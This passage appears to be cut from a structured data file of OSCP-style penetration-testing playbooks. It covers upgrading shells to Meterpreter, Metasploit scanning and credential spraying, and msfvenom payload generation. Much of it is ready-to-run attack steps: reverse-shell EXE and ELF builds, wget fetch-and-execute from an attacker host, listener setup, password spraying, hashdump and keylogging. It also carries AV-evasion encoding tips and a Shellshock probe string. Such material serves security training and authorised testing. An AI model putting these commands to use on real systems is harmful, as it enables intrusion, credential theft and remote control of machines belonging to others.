Upgrade and Management"", ""context"": ""Exploited web application, received basic netcat shell (non-Metasploit). Need Meterpreter features (hashdump, route, portfwd) but current shell is basic command shell. Goal: Upgrade to Meterpreter session within Metasploit framework."", ""approach"": ""Step 1: From netcat shell, note target IP and your listener IP. Step 2: In Metasploit, set up handler to catch upgrade: use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 4444; exploit -j. Step 3: From netcat shell, upload Meterpreter payload: wget http://192.168.45.5:8000/meterpreter.elf; chmod +x meterpreter.elf; ./meterpreter.elf. Step 4: Handler catches Meterpreter connection: '[*] Meterpreter session 1 opened'. Step 5: Verify upgrade: sessions -l (shows meterpreter x64/linux). Step 6: Interact with Meterpreter: sessions -i 1. Step 7: Alternative method - upgrade existing Metasploit shell session: sessions -u <SESSION_ID> (automated upgrade). Step 8: Manage multiple sessions: sessions -l; sessions -i <ID> to switch."", ""commands"": [""msf-handler-setup"", ""msf-session-upgrade-shell"", ""msf-sessions-list"", ""msf-session-interact"", ""msf-session-kill""], ""expected_outcome"": ""Manual upgrade via payload upload: wget downloads Meterpreter binary, execution connects back to handler on port 4444, sessions -l shows new Meterpreter session. Automated sessions -u upgrade: '[*] Upgrading session ID: 1, [*] Starting exploit/multi/handler, [*] Meterpreter session 2 opened'. Original shell (session 1) remains active, new Meterpreter session created (session 2). Upgrade success indicators: sessions -l shows type='meterpreter' not 'shell', meterpreter> prompt appears, commands like sysinfo, getuid work. Upgrade failure reasons: Platform incompatible (wrong architecture), Target lacks dependencies (/tmp not writable), AV/EDR detects Meterpreter upload. Time: 1-2 minutes for manual upgrade, 10-30 seconds for sessions -u. Post-upgrade capabilities: File operations (download, upload, cat, search), Privilege escalation (getsystem), Credential dumping (hashdump, kiwi), Pivoting (route add, portfwd), Surveillance (screenshot, keyscan_start). Session cleanup: Kill dead sessions: sessions -k 1, Kill all sessions: sessions -K (dangerous - confirms twice), View session details: sessions -v (verbose info)."", ""why_this_works"": ""Shell upgrade necessity: Basic shells (nc, /bin/sh) lack Metasploit integration, No built-in file transfer (must use wget/curl manually), No credential dumping or privilege escalation helpers, No pivoting infrastructure (manual iptables/SSH tunneling required). Meterpreter advantages: In-memory execution (no disk writes), Encrypted C2 channel (harder to detect), Modular architecture (load features on demand: load kiwi, load python), Cross-platform consistency (same commands on Windows/Linux). sessions -u upgrade mechanism: 1) Detects session platform (Windows/Linux/macOS), 2) Selects appropriate Meterpreter payload, 3) Sets up background handler on new port, 4) Uploads Meterpreter payload via existing shell, 5) Executes payload, catches connection on handler, 6) Creates new Meterpreter session, preserves original shell. Manual upgrade process: Generate Meterpreter binary: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o meterpreter.elf, Host with HTTP server: python3 -m http.server 8000, Download from target: wget http://<ATTACKER_IP>:8000/meterpreter.elf, Execute on target: chmod +x meterpreter.elf && ./meterpreter.elf. Session management best practices: Name sessions for clarity: sessions -n web-server -i 1, Keep original shell alive (backup if Meterpreter dies), Test Meterpreter commands before killing shell: sysinfo, getuid, Background Meterpreter to run multiple sessions: Ctrl+Z or background. OSCP workflow: Initial foothold via any method (nc shell, PHP shell, SQLi RCE), Upgrade to Metasploit session for tooling, Use Meterpreter for enumeration (post modules), Downgrade to manual commands for stability if Meterpreter detected. Limitations: sessions -u doesn't work on Windows cmd.exe shells (use manual method), sessions -u may be blocked by AV/EDR (manual upload bypasses some signatures), Meterpreter heavier than basic shell (more detectable).""}]","[{""title"": ""Phase 1: Exploit Selection and Verification"", ""notes"": ""After enumeration identifies vulnerable service, search Metasploit for exploit: search <service> <version> or search cve:<year>. Use info to review exploit details (rank, targets, disclosure date). Run check if available (verifies vulnerability without exploiting). Prefer rank:excellent|great modules for OSCP exam stability. Estimated time: 2-3 minutes."", ""commands"": [{""id"": ""msf-search-keyword"", ""shows"": ""See command documentation""}, {""id"": ""msf-search-cve"", ""shows"": ""See command documentation""}, {""id"": ""msf-use-module"", ""example"": ""use exploit/multi/handler"", ""shows"": ""Prompt changes to show module type and path""}, {""id"": ""msf-info-module"", ""example"": ""info exploit/windows/smb/ms17_010_eternalblue"", ""shows"": ""Module details displayed (Name, Module, License, Rank, etc)""}, {""id"": ""msf-exploit-check"", ""example"": ""check"", ""shows"": ""The target is vulnerable""}]}, {""title"": ""Phase 2: Payload Configuration"", ""notes"": ""View compatible payloads: show payloads. Select based on target OS and architecture (x86 vs x64). Use staged payloads (/) for tight space, non-staged (_) for reliability. Set LHOST to your VPN IP (tun0) or interface name. Use uncommon LPORT (80, 443, 53) to bypass egress filtering. Verify all options set: show options. Estimated time: 1-2 minutes."", ""commands"": [{""id"": ""msf-show-payloads"", ""example"": ""show payloads"", ""shows"": ""Compatible Payloads list with name, rank, description""}, {""id"": ""msf-set-payload"", ""example"": ""set payload windows/x64/meterpreter/reverse_tcp"", ""shows"": ""payload => <path> confirmation""}, {""id"": ""msf-set-lhost"", ""example"": ""set LHOST 192.168.45.5"", ""shows"": ""LHOST => <IP> confirmation""}, {""id"": ""msf-set-lport"", ""example"": ""set LPORT 443"", ""shows"": ""LPORT => <PORT> confirmation""}, {""id"": ""msf-show-options"", ""example"": ""show options"", ""shows"": ""Options table displayed with columns: Name, Current Setti...""}]}, {""title"": ""Phase 3: Exploitation Execution"", ""notes"": ""Set RHOSTS to target IP. Optionally set target if multiple OS versions: show targets; set target <ID>. Run exploit (or exploit -j for background). Monitor for session creation or error messages. Common failures: Payload mismatch (wrong arch), Firewall blocking reverse connection, Service already patched. Troubleshooting: Try different target, change payload, use manual exploitation. Estimated time: 30-90 seconds."", ""commands"": [{""id"": ""msf-set-option"", ""example"": ""set RHOSTS 192.168.45.100"", ""shows"": ""OPTION => VALUE confirmation message""}, {""id"": ""msf-show-targets"", ""example"": ""show targets"", ""shows"": ""Available targets list with ID and name""}, {""id"": ""msf-set-target"", ""example"": ""set target 1"", ""shows"": ""target => <ID> confirmation""}, {""id"": ""msf-exploit-run"", ""example"": ""exploit"", ""shows"": ""Started reverse TCP handler""}]}, {""title"": ""Phase 4: Handler Setup for Multi-Target Operations"", ""notes"": ""For multiple targets, set up background handlers first: use exploit/multi/handler; set payload <payload>; set LHOST <IP>; set LPORT <PORT>; set ExitOnSession false; exploit -j -z. Create separate handler per port (4444, 4445, etc.). Verify handlers running: jobs. Handlers catch shells as payloads execute on targets. Estimated time: 1 minute per handler."", ""commands"": [{""id"": ""msf-handler-setup"", ""example"": ""use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run"", ""shows"": ""Started reverse TCP handler on <LHOST>:<LPORT>""}, {""id"": ""msf-handler-background"", ""example"": ""use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run -j"", ""shows"": ""Exploit running as background job <ID>""}, {""id"": ""msf-handler-exitonsession"", ""example"": ""use exploit/multi/handler; set payload windows/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; set ExitOnSession false; run -j"", ""shows"": ""ExitOnSession => false""}, {""id"": ""msf-jobs-list"", ""example"": ""jobs"", ""shows"": ""Jobs table with ID, Name, Payload, Payload opts""}]}, {""title"": ""Phase 5: Session Management and Upgrade"", ""notes"": ""View active sessions: sessions -l. Interact with session: sessions -i <ID>. Upgrade basic shell to Meterpreter: sessions -u <ID>. Background session: Ctrl+Z or background. Switch between sessions as needed. Kill dead sessions: sessions -k <ID>. Name sessions for organization: sessions -n <name> -i <ID>. Estimated time: Instant switching, 10-30 seconds for upgrade."", ""commands"": [{""id"": ""msf-sessions-list"", ""example"": ""sessions -l"", ""shows"": ""Active sessions table with ID, Name, Type, Information, C...""}, {""id"": ""msf-session-interact"", ""example"": ""sessions -i 1"", ""shows"": ""Starting interaction with <ID>""}, {""id"": ""msf-session-upgrade-shell"", ""example"": ""sessions -u 1"", ""shows"": ""Meterpreter session opened""}, {""id"": ""msf-session-background"", ""example"": ""background"", ""shows"": ""Backgrounding session <ID>""}, {""id"": ""msf-session-kill"", ""example"": ""sessions -k 1"", ""shows"": ""Session <ID> closed""}]}]"
"metasploit-scanning","Metasploit Auxiliary Modules - Network Scanning & Service Enumeration","Comprehensive service enumeration using Metasploit auxiliary modules for SMB, SSH, FTP, MySQL, HTTP and other common OSCP services with database integration","METASPLOIT|AUXILIARY|SCANNING|ENUMERATION|SMB|SSH|HTTP|DATABASE|OSCP:HIGH","{""how_to_recognize"": [""Nmap shows open ports but limited service version information"", ""Need to enumerate SMB shares, users, or domain information without enum4linux"", ""SSH/FTP/MySQL services requiring brute force or version detection"", ""HTTP services needing directory enumeration or vulnerability scanning"", ""Services with authentication requiring credential validation across multiple hosts"", ""Requirement to scan multiple targets simultaneously with threading""], ""when_to_look_for"": [""After initial nmap port scan identifies services (deeper enumeration phase)"", ""When specialized tools (enum4linux, hydra) are unavailable or failing"", ""For multi-target scans where threading and database integration add value"", ""When you need structured output stored in Metasploit database for reporting"", ""Before exploitation to validate service versions and configurations"", ""When testing credentials across multiple hosts/services (password spraying)""]}","[{""title"": ""Scenario 1: SMB Enumeration Without Credentials"", ""context"": ""Target network with 5 Windows hosts (192.168.45.100-104), SMB (445/tcp) open. Goal: Enumerate SMB version, shares, users, and domain info without authentication. Alternative to enum4linux."", ""approach"": ""Step 1: Set workspace and import nmap data: workspace -a smb-scan; db_import nmap.xml. Step 2: Run SMB version scanner: use auxiliary/scanner/smb/smb_version; services -p 445 -R; run. Step 3: Enumerate shares: use auxiliary/scanner/smb/smb_enumshares; services -p 445 -R; run. Step 4: Enumerate users: use auxiliary/scanner/smb/smb_enumusers; set RHOSTS 192.168.45.100; run. Step 5: Check for MS17-010 (EternalBlue): use auxiliary/scanner/smb/smb_ms17_010; services -p 445 -R; run. Step 6: Review findings: services -p 445 (shows detected versions); creds (shows any discovered credentials)."", ""commands"": [""msf-workspace-add"", ""msf-db-import"", ""msf-aux-smb-version"", ""msf-aux-smb-shares"", ""msf-aux-smb-users"", ""msf-aux-smb-ms17010""], ""expected_outcome"": ""smb_version reveals: 'Windows Server 2008 R2 Build 7601' (OS), 'Samba 3.6.25' (version). smb_enumshares shows: IPC$ (no auth), ADMIN$ (auth required), C$ (auth required), SharedDocs (readable). smb_enumusers discovers: Administrator, Guest, john, bob (domain users). smb_ms17_010 shows: '[+] 192.168.45.100:445 - Host is VULNERABLE to MS17-010!' or '[-] 192.168.45.100:445 - Host does NOT appear vulnerable'. Time: 2-5 minutes for all 5 hosts with THREADS=5. Data stored in services table (versions), notes table (shares, users). Manual alternative: enum4linux -a <IP> (same functionality, no database storage)."", ""why_this_works"": ""SMB auxiliary modules leverage: Null session authentication (pre-Windows 10, often enabled on legacy systems), SMB protocol commands (NetShareEnumAll, NetUserEnum, NetServerGetInfo), Anonymous bind to IPC$ share (allows limited enumeration). smb_version uses SMB negotiate protocol to extract: OS version (from server capabilities), SMB dialect (SMBv1, SMBv2, SMBv3), Domain/workgroup name. smb_enumshares queries shares with NetShareEnumAll API, notes permissions (READ, WRITE). smb_enumusers uses RID cycling (500-550 for well-known users) or SAMR protocol. smb_ms17_010 checks for: MS17-010 signatures (EternalBlue/EternalRomance), Specific SMBv1 vulnerabilities (CVE-2017-0143 to CVE-2017-0148). Advantages over standalone tools: Threading (scan 50 hosts in time of 1), Database integration (results queryable), Module chaining (auto-populate RHOSTS), Credential reuse (discovered creds auto-tested). OSCP value: Fast domain enumeration, identify EternalBlue targets, discover readable shares for intelligence gathering.""}, {""title"": ""Scenario 2: Multi-Service Brute Force with Credential Reuse"", ""context"": ""Discovered credentials (admin:Password123) on one target. Need to test across 10 targets with SSH (22), FTP (21), and MySQL (3306). Goal: Identify credential reuse for lateral movement."", ""approach"": ""Step 1: Import target list and set workspace: workspace -a cred-spray; db_import targets_nmap.xml. Step 2: Test SSH with discovered credentials: use auxiliary/scanner/ssh/ssh_login; set USERNAME admin; set PASSWORD Password123; services -p 22 -R; run. Step 3: Test FTP: use auxiliary/scanner/ftp/ftp_login; set USERNAME admin; set PASSWORD Password123; services -p 21 -R; run. Step 4: Test MySQL: use auxiliary/scanner/mysql/mysql_login; set USERNAME admin; set PASSWORD Password123; services -p 3306 -R; run. Step 5: Review successful logins: creds (shows valid credentials by service). Step 6: Use discovered sessions: sessions -l (if modules created sessions); sessions -i 1 (interact with SSH session)."", ""commands"": [""msf-aux-ssh-login"", ""msf-aux-ftp-login"", ""msf-aux-mysql-login"", ""msf-creds-list"", ""msf-sessions-list""], ""expected_outcome"": ""ssh_login shows: '[+] 192.168.45.100:22 - Success: admin:Password123 (uid=1000, gid=1000)', creates session if possible. ftp_login shows: '[+] 192.168.45.102:21 - Success: admin:Password123', '[*] 192.168.45.103:21 - Login failed'. mysql_login shows: '[+] 192.168.45.101:3306 - Success: admin:Password123'. creds command displays table: host, port, user, pass, type (password), service (ssh/ftp/mysql). Time: 1-3 minutes with THREADS=10. Successful SSH logins may create command shell sessions (check with sessions -l). Manual alternative: hydra -l admin -p Password123 ssh://192.168.45.100 (per-service, no database integration)."", ""why_this_works"": ""Login scanners automate authentication testing using: Service-specific protocols (SSH v2, FTP commands, MySQL auth), Credential validation without interactive login, Threading for parallel testing (THREADS option), Session creation on success (SSH, FTP can spawn shells). SSH module: Uses Net::SSH library, tests password/key authentication, creates Metasploit session if CREATESESSION=true, stores successful credentials in database. FTP module: Sends USER/PASS commands, checks 230 response code (login success), can execute FTP commands if session created. MySQL module: Uses MySQL authentication protocol, tests against mysql.user table, can execute SQL if credentials valid. Database credential storage: Automatically saves valid credentials in creds table, Associates credentials with host and service (host:port:user:pass), Enables credential reuse in other modules (db_creds provides auto-fill). OSCP strategy: Find one weak credential, spray across all targets, use services -p <PORT> -R for bulk testing. Common OSCP credentials to test: admin:admin, admin:password, root:toor, administrator:Password123. Avoid account lockouts: Set STOP_ON_SUCCESS=true, use THREADS=1 for careful testing, check lockout policies first (auxiliary/scanner/smb/smb_login has USER_AS_PASS option).""}, {""title"": ""Scenario 3: HTTP Service Discovery and Vulnerability Scanning"", ""context"": ""Web application on 192.168.45.100:80 and :8080. Nmap shows 'Apache 2.4.41'. Goal: Enumerate directories, identify web technologies, scan for common vulnerabilities (SQL injection, XSS, misconfigurations)."", ""approach"": ""Step 1: Enumerate HTTP directories: use auxiliary/scanner/http/dir_scanner; set RHOSTS 192.168.45.100; set RPORT 80; set DICTIONARY /usr/share/wordlists/dirb/common.txt; run. Step 2: Identify web technologies: use auxiliary/scanner/http/http_version; set RHOSTS 192.168.45.100; set RPORT 80; run. Step 3: Check for Shellshock vulnerability: use auxiliary/scanner/http/apache_mod_cgi_bash_env; set RHOSTS 192.168.45.100; set TARGETURI /cgi-bin/test.cgi; run. Step 4: Test for SQL injection: use auxiliary/scanner/http/sqlmap; set RHOSTS 192.168.45.100; set TARGETURI /login.php?id=1; run. Step 5: Scan for common web vulnerabilities: use auxiliary/scanner/http/robots_txt; set RHOSTS 192.168.45.100; run. Step 6: Review discovered paths: notes -t http.* (database notes with HTTP findings)."", ""commands"": [""msf-aux-http-dirscanner"", ""msf-aux-http-version"", ""msf-aux-http-robots""], ""expected_outcome"": ""dir_scanner finds: /admin (200 OK), /login.php (200 OK), /backup (403 Forbidden), /config (404 Not Found). Stores results in notes table. http_version reveals: 'Apache/2.4.41 (Ubuntu)', 'PHP/7.4.3'. apache_mod_cgi_bash_env shows: '[+] 192.168.45.100:80 - Vulnerable to CVE-2014-6271 (Shellshock)'. robots_txt discovers: Disallow: /admin, Disallow: /backup (intel on hidden paths). Time: 5-10 minutes for comprehensive HTTP scan. Database storage: notes table contains all findings with timestamps. Manual alternatives: gobuster dir -u http://192.168.45.100 -w common.txt (directories only), nikto -h 192.168.45.100 (vulnerability scan, different coverage)."", ""why_this_works"": ""HTTP auxiliary modules automate web reconnaissance: dir_scanner uses HTTP GET requests with wordlist, checks response codes (200, 301, 302, 401, 403), identifies valid paths and authentication requirements. http_version extracts server headers: Server header (Apache/2.4.41, nginx/1.18.0), X-Powered-By header (PHP/7.4.3, ASP.NET), Detects technologies (WordPress, Joomla via fingerprinting). Shellshock scanner (apache_mod_cgi_bash_env): Tests CGI scripts for bash environment variable injection (CVE-2014-6271), Sends payload: () { :; }; echo vulnerable, Checks response for 'vulnerable' string. robots_txt scanner: Fetches /robots.txt, parses Disallow entries, reveals intentionally hidden paths (often security-sensitive). SQLmap integration (if available): Automates SQL injection testing, Tests GET/POST parameters, Reports injectable parameters with payload. Metasploit HTTP advantages: Database integration (all findings centralized), Module chaining (discovered paths feed into other modules), Credential reuse (creds table provides auth for protected paths), Reporting (db_export includes all HTTP notes). OSCP limitations: Metasploit HTTP modules less comprehensive than dedicated tools (gobuster, nikto, Burp Suite), better for initial discovery. Workflow: Metasploit for quick discovery \u2192 Dedicated tools for deep testing.""}, {""title"": ""Scenario 4: Port Scanning and Service Detection with Database Integration"", ""context"": ""Large subnet (192.168.45.0/24) with unknown hosts. Need comprehensive port scan with service detection. Goal: Use Metasploit for scanning, store results in database, feed into exploitation modules."", ""approach"": ""Step 1: Set up workspace: workspace -a subnet-scan. Step 2: Run TCP SYN scan on top 100 ports: use auxiliary/scanner/portscan/syn; set RHOSTS 192.168.45.0/24; set THREADS 50; run. Step 3: Run service version detection on discovered ports: use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.45.0/24; set PORTS 22,80,443,445,3389; run. Step 4: Review discovered hosts: hosts (shows all active IPs). Step 5: Filter services by port: services -p 445 (all SMB hosts). Step 6: Use database for targeted scanning: use auxiliary/scanner/smb/smb_version; services -p 445 -R; run (auto-populate from database)."", ""commands"": [""msf-aux-portscan-syn"", ""msf-aux-portscan-tcp"", ""msf-hosts-list"", ""msf-services-filter-port""], ""expected_outcome"": ""syn scanner finds: 192.168.45.100 (22,80,445 open), 192.168.45.101 (22,3306 open), 192.168.45.102 (80,443,8080 open). Time: 5-10 minutes for /24 subnet with THREADS=50. tcp scanner provides basic version detection: 192.168.45.100:445 microsoft-ds, 192.168.45.101:3306 mysql. hosts command shows 15 active hosts. services -p 445 filters to 5 SMB hosts for targeted enumeration. Database enables workflow: Scan entire subnet \u2192 Filter by service \u2192 Run targeted auxiliary modules \u2192 Exploit vulnerable services. Manual alternative: nmap -sS -p- 192.168.45.0/24 -oA subnet_scan; db_import subnet_scan.xml (more comprehensive, slower)."", ""why_this_works"": ""Metasploit port scanners provide database-integrated alternative to nmap: syn scanner (portscan/syn) uses raw sockets (requires root), sends SYN packets without completing handshake (stealth), detects open (SYN-ACK), closed (RST), filtered (no response). tcp scanner (portscan/tcp) uses full TCP handshake, more reliable but louder, can grab basic service banners. Advantages over standalone nmap: Native database integration (no import step), Threaded scanning (THREADS option for speed), Direct RHOSTS population (services -p 445 -R), Module ecosystem (scan \u2192 enumerate \u2192 exploit chain). Database-driven workflow: Port scan stores: host.address (IP), service.port (22, 80, 445), service.proto (tcp/udp), service.state (open/closed/filtered). Subsequent modules use: services -p <PORT> -R (set RHOSTS to all matching IPs), hosts -R (set RHOSTS to all workspace IPs), services -s http -R (set RHOSTS to HTTP services). OSCP considerations: Metasploit port scanning slower than nmap (use nmap for initial discovery), Metasploit excels at auxiliary enumeration after ports known, Database integration reduces manual work (no IP copying/pasting). Recommended workflow: nmap -sS -p- <SUBNET> for port discovery \u2192 db_import \u2192 Metasploit auxiliary modules for service enumeration \u2192 Metasploit exploit modules for attacks. Threading best practices: Local network: THREADS=50, VPN connection: THREADS=10 (avoid dropped packets), Single target: THREADS=1 (accurate banner grabbing).""}]","[{""title"": ""Phase 1: Initial Service Discovery (Post-Nmap)"", ""notes"": ""After nmap port scan, use Metasploit auxiliary modules for deeper service enumeration. Import nmap results first (db_import), then use services -p <PORT> -R for auto-targeting. Threading speeds up multi-host scans (set THREADS 10-50). Estimated time: 5-15 minutes depending on target count."", ""commands"": [{""id"": ""msf-db-import"", ""example"": ""db_import /home/kali/scans/network.xml"", ""shows"": ""Importing data...""}, {""id"": ""msf-services-filter-port"", ""shows"": ""See command documentation""}, {""id"": ""msf-aux-smb-version"", ""example"": ""use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.45.100; run"", ""shows"": ""SMB Detected (versions: X, Y)""}, {""id"": ""msf-aux-ssh-version"", ""shows"": ""See command documentation""}, {""id"": ""msf-aux-http-version"", ""shows"": ""See command documentation""}]}, {""title"": ""Phase 2: SMB Enumeration (Windows Targets)"", ""notes"": ""SMB is high-value OSCP target. Run version detection first, then share enumeration, then user enumeration. Check MS17-010 on all SMB hosts (easy win if vulnerable). Use smb_login for credential testing. Estimated time: 3-5 minutes per subnet."", ""commands"": [{""id"": ""msf-aux-smb-version"", ""example"": ""use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.45.100; run"", ""shows"": ""SMB Detected (versions: X, Y)""}, {""id"": ""msf-aux-smb-shares"", ""shows"": ""See command documentation""}, {""id"": ""msf-aux-smb-users"", ""shows"": ""See command documentation""}, {""id"": ""msf-aux-smb-ms17010"", ""shows"": ""See command documentation""}, {""id"": ""msf-aux-smb-login"", ""shows"": ""See command documentation""}]}, {""title"": ""Phase 3: Credential Testing (Password Spraying)"", ""notes"": ""After discovering credentials (web app, config file, default creds), spray across all targets. Use ssh_login, ftp_login, mysql_login modules. Set STOP_ON_SUCCESS=true to avoid lockouts. Check creds command after each scan for successful logins. Estimated time: 2-5 minutes for credential spray."", ""commands"": [{""id"": ""msf-aux-ssh-login"", ""example"": ""use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.45.100; set USERNAME admin; set PASS_FILE /usr/share/wordlists/rockyou.txt; run"", ""shows"": ""Success: 'user:password' uid=...""}, {""id"": ""msf-aux-ftp-login"", ""shows"": ""See command documentation""}, {""id"": ""msf-aux-mysql-login"", ""example"": ""use auxiliary/scanner/mysql/mysql_login; set RHOSTS 192.168.45.100; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; run"", ""shows"": ""Success: 'user:password'""}, {""id"": ""msf-creds-list"", ""shows"": ""See command documentation""}]}, {""title"": ""Phase 4: Web Application Discovery"", ""notes"": ""HTTP services require multi-faceted scanning. Run dir_scanner for path discovery, http_version for technology fingerprinting, robots_txt for intel, then vulnerability-specific scans (Shellshock, SQL injection). Results in notes table feed into exploitation phase. Estimated time: 10-20 minutes per web server."", ""commands"": [{""id"": ""msf-aux-http-dirscanner"", ""shows"": ""See command documentation""}, {""id"": ""msf-aux-http-version"", ""shows"": ""See command documentation""}, {""id"": ""msf-aux-http-robots"", ""shows"": ""See command documentation""}]}, {""title"": ""Phase 5: Database Review and Exploitation Prep"", ""notes"": ""Review all findings: hosts (discovered hosts), services (enumerated services with versions), creds (valid credentials), notes (auxiliary module findings). Use filters: services -p 445 (SMB targets), services -s http (web servers), creds (credential reuse opportunities). Export for reporting: db_export -f xml /root/scan_results.xml. Estimated time: 5 minutes to review and prioritize targets."", ""commands"": [{""id"": ""msf-hosts-list"", ""shows"": ""See command documentation""}, {""id"": ""msf-services-list"", ""shows"": ""See command documentation""}, {""id"": ""msf-creds-list"", ""shows"": ""See command documentation""}, {""id"": ""msf-db-export"", ""shows"": ""See command documentation""}]}]"
"metasploit-payloads","Metasploit Payload Generation - msfvenom Guide","Comprehensive msfvenom payload creation for Windows, Linux, and web platforms including encoding, bad character handling, and custom shellcode generation for OSCP scenarios","METASPLOIT|MSFVENOM|PAYLOADS|SHELLCODE|ENCODING|WEB_SHELLS|OSCP:HIGH|DELIVERY","{""how_to_recognize"": [""Need standalone payload for web upload (PHP, ASPX, JSP file)"", ""Compiled binary required for Windows exploitation (EXE, DLL, MSI)"", ""Linux target requires ELF binary or scripting language payload"", ""Web application allows file upload but filters certain file types"", ""Exploit requires custom shellcode with bad character restrictions"", ""AV/EDR detection requires payload encoding or obfuscation""], ""when_to_look_for"": [""File upload vulnerability discovered (need PHP/ASPX/JSP shell)"", ""RCE vulnerability confirmed but need payload delivery mechanism"", ""Exploiting buffer overflow with custom shellcode requirements"", ""Social engineering scenario requires executable payload (phishing, USB)"", ""Web shell needed for initial access (unrestricted file upload)"", ""Manual exploitation outside Metasploit framework (nc listener setup)""]}","[{""title"": ""Scenario 1: Windows Reverse Shell for File Upload Vulnerability"", ""context"": ""Discovered unrestricted file upload on Windows IIS server. Can upload EXE files to web-accessible directory (/uploads/). Goal: Generate Windows reverse shell, upload via web form, execute for SYSTEM access."", ""approach"": ""Step 1: Generate Windows 64-bit reverse shell: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 -f exe -o shell.exe. Step 2: Set up netcat listener: nc -lvnp 443 (or use Metasploit handler for Meterpreter). Step 3: Upload shell.exe via web form. Step 4: Browse to http://192.168.45.100/uploads/shell.exe to trigger execution. Step 5: Catch shell on listener. Alternative payload: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.5 LPORT=443 -f exe -o meterpreter.exe (Meterpreter for post-exploitation features, requires multi/handler)."", ""commands"": [""msfvenom-windows-reverse"", ""msfvenom-windows-meterpreter"", ""msf-handler-setup""], ""expected_outcome"": ""msfvenom generates shell.exe (7-15 KB for shell_reverse_tcp, 70-80 KB for meterpreter/reverse_tcp). Upload succeeds (file appears at /uploads/shell.exe). Browsing to URL executes payload, nc listener shows: 'Connection from 192.168.45.100:49234, Microsoft Windows [Version 6.1.7601], C:\\inetpub\\wwwroot\\uploads>'. Shell runs as IIS user (often NETWORK SERVICE or ApplicationPoolIdentity). Upgrade privileges: whoami /priv; if SeImpersonatePrivilege enabled, use Juicy Potato. Time: 2-3 minutes from payload generation to shell access. Common issues: AV detects payload (use encoding: msfvenom -e x86/shikata_ga_nai -i 3), Firewall blocks port 443 outbound (try ports 80, 53, 8080), Browser downloads instead of executes (need different trigger: curl http://192.168.45.100/uploads/shell.exe, or SMB exec: \\\\192.168.45.100\\uploads\\shell.exe)."", ""why_this_works"": ""msfvenom payload generation: Combines MSF payload with encoder/format in single command, -p specifies payload (windows/x64/shell_reverse_tcp = 64-bit non-staged TCP reverse shell), LHOST/LPORT configure reverse connection (target connects to attacker), -f exe outputs as Windows executable (PE format), -o shell.exe saves to file. Reverse shell mechanics: Payload embedded in EXE as shellcode in .text section, On execution: 1) Resolves ws2_32.dll functions (WSAStartup, connect, recv, send), 2) Creates TCP socket to LHOST:LPORT, 3) Redirects stdin/stdout/stderr to socket, 4) Spawns cmd.exe with handle inheritance, 5) Attacker receives interactive shell. Staged vs non-staged: shell_reverse_tcp (non-staged) = full payload in single stage (~7 KB), meterpreter/reverse_tcp (staged) = small stager + full stage (~300 bytes + 70 KB), Staged requires multi/handler (nc doesn't support staging), Non-staged works with nc or multi/handler. File upload exploitation: Unrestricted upload allows arbitrary file types (EXE, DLL, BAT, VBS), Accessible upload directory enables execution (IIS: /uploads/, Apache: /var/www/html/uploads/), Direct browsing triggers execution if server misconfigured (should return file, not execute), Alternative triggers: LFI (http://target/page.php?file=../uploads/shell.exe), RCE (system('C:\\inetpub\\wwwroot\\uploads\\shell.exe')), SMB execution (from attacker: psexec.py admin:password@192.168.45.100 'C:\\inetpub\\wwwroot\\uploads\\shell.exe'). Port selection strategy: 443 (HTTPS) - often allowed outbound by firewalls, 80 (HTTP) - nearly always allowed, 53 (DNS) - bypasses restrictive rules, 4444 (Metasploit default) - often blocked. OSCP notes: Test payload locally before uploading: wine shell.exe (Linux), .\\shell.exe (Windows VM), Verify listener before triggering (nc listener running first), Encode if AV present: msfvenom -e x86/shikata_ga_nai -i 3 -p windows/shell_reverse_tcp.""}, {""title"": ""Scenario 2: Linux ELF Payload for Buffer Overflow Exploitation"", ""context"": ""Exploiting Linux buffer overflow in vulnerable SUID binary (/usr/local/bin/vuln). Need shellcode that spawns /bin/sh with elevated privileges. Goal: Generate custom ELF payload, deliver via exploit, escalate to root."", ""approach"": ""Step 1: Generate Linux 64-bit reverse shell ELF: msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=4444 -f elf -o exploit.elf. Step 2: Set up listener: nc -lvnp 4444. Step 3: Transfer ELF to target: python3 -m http.server 8000; wget http://192.168.45.5:8000/exploit.elf (from target). Step 4: Make executable: chmod +x exploit.elf. Step 5: Execute: ./exploit.elf. Step 6: Catch shell on listener. Alternative for direct shellcode (buffer overflow): msfvenom -p linux/x64/exec CMD=/bin/sh -f c (outputs C-formatted shellcode for injection). Step 7: Copy shellcode bytes to exploit script: shellcode = b'\\x6a\\x3b\\x58\\x99...'."", ""commands"": [""msfvenom-linux-reverse"", ""msfvenom-linux-shellcode""], ""expected_outcome"": ""msfvenom generates exploit.elf (300-500 bytes for shell_reverse_tcp). Transfer succeeds via wget or curl. chmod +x sets execute permission. Execution connects back to nc listener: 'Connection from 192.168.45.100:54321, $ id, uid=1000(bob) gid=1000(bob) groups=1000(bob)'. If targeting SUID binary, shell has root privileges: 'uid=0(root) gid=1000(bob) groups=1000(bob)'. Shellcode generation (-f c) produces: 'unsigned char buf[] = \""\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00...\""; (24-48 bytes for exec). Copy to exploit script for buffer overflow. Time: 1-2 minutes for payload generation and transfer. Common issues: ELF wrong architecture (x86 vs x64): file exploit.elf shows ELF 64-bit LSB executable, Target lacks execute permissions on /tmp (use /dev/shm/ instead), Firewall blocks outbound (try bind shell: msfvenom -p linux/x64/shell_bind_tcp LPORT=4444)."", ""why_this_works"": ""Linux ELF payload structure: ELF header (identifies as Linux executable), .text section (contains shellcode), Entry point (jumps to shellcode on execution). -f elf creates standalone binary (vs raw shellcode), No libc dependencies (pure syscall-based shellcode). Shellcode internals (shell_reverse_tcp): 1) socket() syscall (create TCP socket), 2) 